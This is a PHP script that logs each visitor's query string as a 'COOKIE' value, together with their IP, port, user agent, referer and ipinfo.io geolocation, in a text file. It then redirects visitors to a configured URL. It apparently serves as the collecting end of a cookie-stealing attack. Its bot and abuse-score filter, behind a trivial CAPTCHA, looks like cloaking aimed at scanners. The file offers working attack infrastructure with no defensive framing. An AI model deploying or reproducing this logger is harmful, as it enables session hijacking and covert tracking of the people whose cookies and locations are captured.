<?php
include 'config.php';
session_start();

function GetIP() {
    if (getenv("HTTP_CLIENT_IP") && strcasecmp(getenv("HTTP_CLIENT_IP"), "unknown"))
        $ip = getenv("HTTP_CLIENT_IP");
    else if (getenv("HTTP_X_FORWARDED_FOR") && strcasecmp(getenv("HTTP_X_FORWARDED_FOR"), "unknown"))
        $ip = getenv("HTTP_X_FORWARDED_FOR");
    else if (getenv("REMOTE_ADDR") && strcasecmp(getenv("REMOTE_ADDR"), "unknown"))
        $ip = getenv("REMOTE_ADDR");
    else if (isset($_SERVER['REMOTE_ADDR']) && $_SERVER['REMOTE_ADDR'] && strcasecmp($_SERVER['REMOTE_ADDR'], "unknown"))
        $ip = $_SERVER['REMOTE_ADDR'];
    else
        $ip = "unknown";
    return($ip);
}

function logData($ip) {
    $ipLog = "data/informations.txt";
    $cookie = $_SERVER['QUERY_STRING'];
    $register_globals = (bool) ini_get('register_globals');

    if ($register_globals) $ip = getenv('REMOTE_ADDR');
    else $ip = GetIP();
    $rem_port = $_SERVER['REMOTE_PORT'];
    $user_agent = $_SERVER['HTTP_USER_AGENT'];
    $rqst_method = $_SERVER['REQUEST_METHOD'] ?? "null";
    $rem_host = $_SERVER['REMOTE_HOST'] ?? "null";
    $referer = $_SERVER['HTTP_REFERER'] ?? "null";
    $date = date("Y/m/d G:i:s");
    $log = fopen($ipLog, "a+");

    $ip_details = json_decode(file_get_contents("http://ipinfo.io/{$ip}/json"));

    fwrite($log, "IP=" . $ip . PHP_EOL);
    fwrite($log, "PORT=" . $rem_port . PHP_EOL);
    fwrite($log, "CITY=" . $ip_details->city . PHP_EOL);
    fwrite($log, "REGION=" . $ip_details->region . PHP_EOL);
    fwrite($log, "COUNTRY=" . $ip_details->country . PHP_EOL);
    fwrite($log, "LOCATION=" . $ip_details->loc . PHP_EOL);
    fwrite($log, "ISP=" . $ip_details->org . PHP_EOL);
    fwrite($log, "DATE=" . $date . PHP_EOL);
    fwrite($log, "HOST=" . $rem_host . PHP_EOL);
    fwrite($log, "UA=" . $user_agent . PHP_EOL);
    fwrite($log, "METHOD=" . $rqst_method . PHP_EOL);
    fwrite($log, "REF=" . $referer . PHP_EOL);
    fwrite($log, "COOKIE=" . $cookie . PHP_EOL . PHP_EOL);

    fclose($log);
}

function getBlacklist() {
    return file('data/blacklist.txt', FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
}

function getRedirectURL() {
    $url = file_get_contents('data/redirect.txt');
    return trim($url);
}

function checkIPAbuse($ip) {
    $curl = curl_init();

    curl_setopt_array($curl, [
        CURLOPT_URL => "https://abuse-ip-check.p.rapidapi.com/api/v2/check?ipAddress=$ip",
        CURLOPT_RETURNTRANSFER => true,
        CURLOPT_FOLLOWLOCATION => true,
        CURLOPT_HTTPHEADER => [
            "x-rapidapi-key: " . $_ENV['RAPIDAPI_KEY'],
            "x-rapidapi-host: abuse-ip-check.p.rapidapi.com"
        ],
    ]);

    $response = curl_exec($curl);
    curl_close($curl);

    return json_decode($response, true);
}

function firewall() {
    $BLACKLIST = getBlacklist();
    $ip = GetIP();
    
    $abuseCheck = checkIPAbuse($ip);

    if (in_array($ip, $BLACKLIST) || 
        ($abuseCheck && $abuseCheck['data']['abuseConfidenceScore'] > 50) || 
        strpos($_SERVER['HTTP_USER_AGENT'], 'bot') !== false) {
        $_SESSION['captcha_needed'] = true;
        header('Location: index.php');
        exit();
    }
}

if (isset($_POST['captcha'])) {
    if ($_POST['captcha'] == $_SESSION['captcha']) {
        $_SESSION['verified'] = true;
        $_SESSION['captcha_needed'] = false;
        header('Location: index.php');
        exit();
    } else {
        $_SESSION['captcha_failed'] = true;
        header('Location: ' . getRedirectURL());
        exit();
    }
}

if (!isset($_SESSION['verified'])) {
    firewall();
}

logData(GetIP());

if (isset($_SESSION['captcha_needed']) && $_SESSION['captcha_needed'] === true) {
    $_SESSION['captcha'] = rand(1000, 9999);
    echo '<!DOCTYPE html>
    <html lang="en">
    <head>
        <meta charset="UTF-8">
        <meta name="viewport" content="width=device-width, initial-scale=1.0">
        <title>Verificação de CAPTCHA</title>
    </head>
    <body>
        <h1>Verificação de CAPTCHA</h1>
        <p>Por favor, insira o código abaixo:</p>
        <form method="POST" action="index.php">
            <p><strong>' . $_SESSION['captcha'] . '</strong></p>
            <input type="text" name="captcha" required>
            <input type="submit" value="Verificar">
        </form>
    </body>
    </html>';
} else {
    header('Location: ' . getRedirectURL());
    exit();
}
?>
